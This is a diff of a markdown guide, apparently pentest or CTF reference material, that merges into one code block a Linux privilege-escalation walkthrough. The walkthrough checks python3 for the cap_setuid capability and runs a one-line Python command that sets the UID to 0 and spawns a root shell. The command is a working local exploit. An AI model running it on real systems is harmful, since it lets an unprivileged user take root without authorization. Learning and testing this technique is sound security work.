@@ -60,19 +60,15 @@ If you find python3 has the cap_setuid capability, here is how a regular user es
 
 **1. Verify the capability**
 ```bash
+# 1. Verify the capability
 getcap /usr/bin/python3
-```
+# Output: /usr/bin/python3 = cap_setuid+ep
 
-# Output:
-
-```bash
-/usr/bin/python3 = cap_setuid+ep
-```
-
-**2. Execute the exploit**
-
-```bash 
+# 2. Execute the exploit
 python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# 3. Result
+# You are dropped into a root shell (#)
 ```
 
 **3. Result**
